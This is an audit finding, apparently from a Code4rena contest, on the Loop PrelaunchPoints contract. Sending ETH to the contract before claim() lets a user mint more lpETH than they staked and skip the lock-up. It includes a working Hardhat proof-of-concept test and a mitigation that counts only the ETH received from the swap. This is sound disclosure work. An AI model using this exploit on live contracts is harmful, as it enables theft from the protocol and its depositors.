## [H-01] Users can still "deposit" in order to mint more `lpETH` than they have locked during the lock-up period

### Impact

The main invariant : "Deposits are active up to the `lpETH` contract and `lpETH`Vault contract are set" is broken.

Even though the deposits are not active anymore, users are still able to gain the benefits from depositing and bypass the LRT lock-up period enforced by the protocol to get more `lpETH` than they are owed.

### Proof of concept

The core idea of the `PrelaunchPoints.sol` contract is that users lock their LRT tokens for a certain period and are able to claim `lpETH` based upon their stake when this period comes to an end.

When administrators call `setLoopAddresses()`, users can't deposit their LRT anymore and the amount of `lpETH` they are able to mint is settled.

These `lpETH` can be claimed using the `claim()` function after the `startClaimDate` set by administrators has been reached.

The issue is when the LRT tokens users are trying to `claim()` from is not ETH nor WETH, the LRT tokens are first swapped to native ETH through the `_fillQuote()` function.

Right after, the contract uses its new ETH balance to mint the corresponding amount of `lpETH` which should only be equal to the amount received from the swap.

<https://github.com/code-423n4/2024-05-loop/blob/main/src/PrelaunchPoints.sol#L252-L264>

```solidity
// Swap LRT to ETH
_fillQuote(IERC20(_token), userClaim, _data);
// Gets the contract's balance
claimedAmount = address(this).balance;
// Mints `lpETH` using the contract's balance
lpETH.deposit{value: claimedAmount}(_receiver);
```

However if a user transfers native ETH to the contract before calling `claim()`, the amount of `lpETH` to mint will include the amount of ETH transfered.

This will end up in the user artificially depositing without having to deal with the lock-up period, thus, minting more `lpETH` tokens than they should have based upon their initial stake.

In the below PoC, we are claiming 100% of our initial deposit but it is possible to claim way less and repeatitively execute the exploit to mint more `lpETH`

The following PoC will demonstrate the steps to take advantage of the issue.

Add this test to `test/PrelaunchPoints0x.test.ts` and execute it with

*Make sure you have added your 0x API token to your `.env` file*

```bash
npx hardhat test --grep "it should claim more"
```

```js
it(`it should claim more`, async function () {
    let token = tokens[2]; // ezETH
    lockToken = (await ethers.getContractAt(
      "IERC20",
      token.address
    )) as unknown as IERC20

    // Impersonate whale
    const depositorAddress = token.whale
    await impersonateAccount(depositorAddress)
    const depositor = await ethers.getSigner(depositorAddress)
    await setBalance(depositorAddress, parseEther("100"))

    // Get pre-lock balances
    const tokenBalanceBefore = await lockToken.balanceOf(depositor)

    // Lock token in Prelaunch
    await lockToken.connect(depositor).approve(prelaunchPoints, sellAmount)
    await prelaunchPoints
      .connect(depositor)
      .lock(token.address, sellAmount, referral)

    // Get post-lock balances
    const tokenBalanceAfter = await lockToken.balanceOf(depositor)
    const claimToken = token.name == "WETH" ? ETH : token.address
    const lockedBalance = await prelaunchPoints.balances(
      depositor.address,
      claimToken
    )
    expect(tokenBalanceAfter).to.be.eq(tokenBalanceBefore - sellAmount)
    expect(lockedBalance).to.be.eq(sellAmount)

    // Activate claiming
    await prelaunchPoints.setLoopAddresses(lpETH, lpETHVault)
    const newTime =
      (await prelaunchPoints.loopActivation()) +
      (await prelaunchPoints.TIMELOCK()) +
      1n
    await time.increaseTo(newTime)
    await prelaunchPoints.convertAllETH()

    // Get Quote from 0x API
    const headers = { "0x-api-key": ZEROX_API_KEY }
    const quoteResponse = await fetch(
      `https://api.0x.org/swap/v1/quote?buyToken=${ETH}&sellAmount=${sellAmount}&sellToken=${token.address}`,
      { headers }
    )

    // Check for error from 0x API
    if (quoteResponse.status !== 200) {
      const body = await quoteResponse.text()
      throw new Error(body)
    }
    const quote = await quoteResponse.json()

    const exchange = quote.orders[0] ? quote.orders[0].source : ""
    const exchangeCode = exchange == "Uniswap_V3" ? 1 : 0

    // Claim
    console.log("Sending 1 ETH to PrelaunchPoints contract");
    let prelaunchAddress = await prelaunchPoints.getAddress();
    // User sends 1 ETH to the contract
    await depositor.sendTransaction({
      to: prelaunchAddress,
      value: ethers.parseEther("1.0"), // Sends exactly 1.0 ether
    });
    await prelaunchPoints
      .connect(depositor)
      .claim(claimToken, 100, exchangeCode, quote.data)

    expect(await prelaunchPoints.balances(depositor, token.address)).to.be.eq(
      0
    )

    const balanceLpETHAfter = await lpETH.balanceOf(depositor)
    expect(balanceLpETHAfter).to.be.gt((sellAmount * 95n) / 100n)
    console.log("LP ETH balance :", await lpETH.balanceOf(depositor.address));
    return;
})
```

### Recommended mitigation steps

Modify the `_fillQuote()` function to return boughtETHAmount and use this amount to mint `lpETH` like such

```solidity
function _fillQuote(IERC20 _sellToken, uint256 _amount, bytes calldata _swapCallData) internal returns(uint256) {
    // Track our balance of the buyToken to determine how much we've bought.
    uint256 boughtETHAmount = address(this).balance;

    require(_sellToken.approve(exchangeProxy, _amount));

    (bool success,) = payable(exchangeProxy).call{value: 0}(_swapCallData);
    if (!success) {
        revert SwapCallFailed();
    }

    // Use our current buyToken balance to determine how much we've bought.
    boughtETHAmount = address(this).balance - boughtETHAmount;
    emit SwappedTokens(address(_sellToken), _amount, boughtETHAmount);
    return boughtETHAmount;
}

function _claim(address _token, address _receiver, uint8 _percentage, Exchange _exchange, bytes calldata _data)
    internal
    returns (uint256 claimedAmount)
{
    uint256 userStake = balances[msg.sender][_token];
    if (userStake == 0) {
        revert NothingToClaim();
    }
    if (_token == ETH) {
        claimedAmount = userStake.mulDiv(totalLpETH, totalSupply);
        balances[msg.sender][_token] = 0;
        lpETH.safeTransfer(_receiver, claimedAmount);
    } else {
        uint256 userClaim = userStake * _percentage / 100;
        _validateData(_token, userClaim, _exchange, _data);
        balances[msg.sender][_token] = userStake - userClaim;

        // At this point there should not be any ETH in the contract
        // Swap token to ETH
        claimedAmount = _fillQuote(IERC20(_token), userClaim, _data);

        lpETH.deposit{value: claimedAmount}(_receiver);
    }
    emit Claimed(msg.sender, _token, claimedAmount);
}
```
